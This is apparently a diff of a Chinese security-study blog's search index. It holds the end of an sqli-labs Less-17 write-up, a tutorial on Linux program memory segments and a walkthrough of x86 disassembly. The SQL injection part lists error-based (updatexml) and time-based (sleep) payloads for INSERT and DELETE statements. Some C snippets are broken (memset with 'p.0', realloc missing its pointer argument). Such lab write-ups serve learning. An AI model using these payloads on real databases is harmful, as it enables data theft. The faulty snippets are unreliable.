+<h1 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h1><p>上述为update下的注入。<br>由于update、insert和delete三者应用场景的特殊性，<br>一般不会有数据回显，故一般选取布尔注入和延时注入。<br>1、insert下的注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔注入：</span><br><span class="line">insert into Rj45(id,word)values(3,updatexml(1,(concat(0x7e,(select database()),0x7e)),1));</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/12.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入：</span><br><span class="line">insert into Rj45(id,word)values(5,if((ord(left((select database()),1))=ascii(&apos;C&apos;)),sleep(5),0));</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/13.png" alt><br>注意，当延时注入成功后，需要修改插入的id数据,防止出现主键唯一性冲突。<br>2、delete下的注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔注入：</span><br><span class="line">delete from Rj45 where id=0 and updatexml(1,(concat(0x7e,(select database()),0x7e)),1);</span><br><span class="line"></span><br><span class="line">延时注入：</span><br><span class="line">delete from Rj45 where id=3 and if((ord(left((select database()),1))=ascii(&apos;C&apos;)),sleep(5),0);</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1sqli-labs-Less17%E5%AD%A6%E4%B9%A0%E5%A2%9E%E5%88%A0%E6%94%B9%E5%BD%A2%E5%BC%8F%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/14.png" alt></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>1、mysql注入天书<br>2、php手册<br><a href="https://www.php.net/manual/zh/" target="_blank" rel="noopener">https://www.php.net/manual/zh/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>程序在内存中的分布</title>
+    <url>/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/</url>
+    <content><![CDATA[<h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><p>对于x86架构下的Linux程序，在被载入内存中会展开成如下情况:</p>
+<p><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/1.png" alt></p>
+<p>1、对于x86 架构的系统来说，器虚拟空间为4GB.<br>2、高位的1GB为内核空间。<br>3、低位的3GB由Text segment(ELF)、Data segment、Bss segment、Heap、Memory mapping Segment、stack。<br>4、Memory mapping Segment存放Linux的动态链接库<br>5、对于stack来说，其最大值为8MB。</p>
+<h1 id="bss"><a href="#bss" class="headerlink" title=".bss"></a>.bss</h1><p>1、作用：<br>bss段用来存放没有被初始化和已经被初始化为0的全局变量</p>
+<p>2、例子<br><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/2.png" alt></p>
+<p>3、编译链接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gcc -g bss.c -o bss</span><br></pre></td></tr></table></figure>
+<p>4、查看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -h bss | grep bss</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/3.png" alt></p>
+<h1 id="data"><a href="#data" class="headerlink" title=".data"></a>.data</h1><p>1、作用：<br>data段用来存放已经被初始化为非0的全局变量</p>
+<p>2、例子</p>
+<p><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/4.png" alt></p>
+<p>3、编译链接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -g data.c -o data</span><br></pre></td></tr></table></figure>
+<p>4、查看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -h data | grep \\.data</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/5.png" alt></p>
+<h1 id="rodata"><a href="#rodata" class="headerlink" title=".rodata"></a>.rodata</h1><p>作用：<br>rodata段用来存放常量数据、被编译器自动存放来的字符串和加<code>const</code>关键字的常量数据。</p>
+<h1 id="text"><a href="#text" class="headerlink" title=".text"></a>.text</h1><p>作用：<br>text段用来存放代码和部分整数常量，该段是可执行的。</p>
+<h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><p>作用：<br>1、stack存放函数的临时变量、局部变量、函数参数和返回值<br>2、由编译器自动分配和释放。</p>
+<h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><p>1、作用：<br>heap用来动态分配内存，由程序员控制，交由程序自身决定开辟和释放。<br>malloc&amp;free<br>calloc&amp;realloc<br>2、例子<br>malloc&amp;free<br><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/6.png" alt><br>3、编译链接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gcc heap.c -o heap</span><br></pre></td></tr></table></figure>
+<p>4、查看<br><img src="/%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%88%86%E5%B8%83/7.png" alt></p>
+<p>5、其他方式</p>
+<p>1）calloc()函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void *calloc(size_t number,size_t size);</span><br><span class="line"></span><br><span class="line">用法1</span><br><span class="line">int *p = (int *)calloc(1024,sizeof(int));</span><br><span class="line"></span><br><span class="line">用法2</span><br><span class="line">int *p = (int *)malloc(1024*sizeof(int));</span><br><span class="line">memset(p.0,1024*sizeof(int));</span><br></pre></td></tr></table></figure>
+<p>number表示要分配元素的个数、size表示每个元素的大小、分配的内存空间是number<em>size、返回值为void</em>类型的指针，指向分配号的内存首地址。<br>2）realloc()函数<br>realloc()函数用来重新分配正在使用的一块内存大小。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void *realloc(void *ptr,size_t size);</span><br><span class="line"></span><br><span class="line">int *p = (int *)malloc(1024);</span><br><span class="line">p = (int *)realloc(512);// 重新分配为 512字节大小内存</span><br><span class="line">p = (int *)realloc(2048);// 重新分配为2048字节大小内存</span><br></pre></td></tr></table></figure>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/hythink/p/5422602.html" target="_blank" rel="noopener">https://www.cnblogs.com/hythink/p/5422602.html</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>由一个简单的程序学习常见汇编指令</title>
+    <url>/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直以来，内心有股焦急焦虑，急冲冲的学习，急冲冲的比赛，没有时间和心思回过头来静心总结。<br>突然之间想安静下来回顾和记录一下pwn的知识点 <del>其实是写web有点累了，想切换一下脑壳，看心情更新吧</del></p>
+<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p><img src="/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/1.png" alt><br>编译</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc stack.c -o stack -m32</span><br></pre></td></tr></table></figure>
+<h1 id="反汇编分析"><a href="#反汇编分析" class="headerlink" title="反汇编分析"></a>反汇编分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -d stack -M intel</span><br></pre></td></tr></table></figure>
+<p><img src="/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/2.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">080483db &lt;fun&gt;:</span><br><span class="line"> 80483db:	55                   	push   ebp//将ebp压入栈</span><br><span class="line"> 80483dc:	89 e5                	mov    ebp,esp//将esp压入栈</span><br><span class="line"> 80483de:	83 ec 10             	sub    esp,0x10//在栈上分配0x10个字节的空间</span><br><span class="line"> 80483e1:	c7 45 f8 01 00 00 00 	mov    DWORD PTR [ebp-0x8],0x1//将0x1存储在[ebp-0x8],dword是双字即四个字节，ptr是指针，这里指[ebp-0x8]地址是一个双字型地址</span><br><span class="line"> 80483e8:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]//将[esp+0x8]的数据复制到eax</span><br><span class="line"> 80483eb:	89 45 fc             	mov    DWORD PTR [ebp-0x4],eax//将eax内的数据复制到[ebp-0x4]</span><br><span class="line"> 80483ee:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]//将[ebp+0x8]内的数据复制到edx</span><br><span class="line"> 80483f1:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]//将[ebp+0xc]内的数据复制到eax</span><br><span class="line"> 80483f4:	01 d0                	add    eax,edx//将edx内的数据与eax内的数据相加，复制到eax</span><br><span class="line"> 80483f6:	c9                   	leave  //等价于mov ebp,esp;pop ebp</span><br><span class="line"> 80483f7:	c3                   	ret   //等价于pop ip;用栈中的数据，修改IP的内容，实现近转移</span><br><span class="line"></span><br><span class="line">080483f8 &lt;main&gt;:</span><br><span class="line"> 80483f8:	55                   	push   ebp</span><br><span class="line"> 80483f9:	89 e5                	mov    ebp,esp</span><br><span class="line"> 80483fb:	6a 14                	push   0x14//将0x14=20压入栈</span><br><span class="line"> 80483fd:	6a 0a                	push   0xa////将0xa=10压入栈</span><br><span class="line"> 80483ff:	e8 d7 ff ff ff       	call   80483db &lt;fun&gt;//调用fun函数</span><br><span class="line"> 8048404:	83 c4 08             	add    esp,0x8//esp+8，进行栈帧还原</span><br><span class="line"> 8048407:	b8 00 00 00 00       	mov    eax,0x0//清空eax内的数据</span><br><span class="line"> 804840c:	c9                   	leave  </span><br><span class="line"> 804840d:	c3                   	ret    </span><br><span class="line"> 804840e:	66 90                	xchg   ax,ax//交换ax;等价于nop</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见汇编指令"><a href="#常见汇编指令" class="headerlink" title="常见汇编指令"></a>常见汇编指令</h1><p>1、寄存器</p>
+<p><img src="/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/3.png" alt><br>2、常见汇编指令</p>
+<p><img src="/%E7%94%B1%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/4.png" alt></p>
+<h1 id="下期预告"><a href="#下期预告" class="headerlink" title="下期预告"></a>下期预告</h1><p>可能写如何编写一个简单的汇编程序、可能写函数在栈中的调用过程、ret指令与call指令的深入理解、可能写程序在内存中的分布、编译链接过程、可能写函数调用约定、x86架构与x64架构的不同之处。<br>个人感觉这些都是pwn的基础内容。建议如果想深入学习pwn的话，推荐首先学习《汇编语言(第3版)》。</p>
 ]]></content>
   </entry>
   <entry>
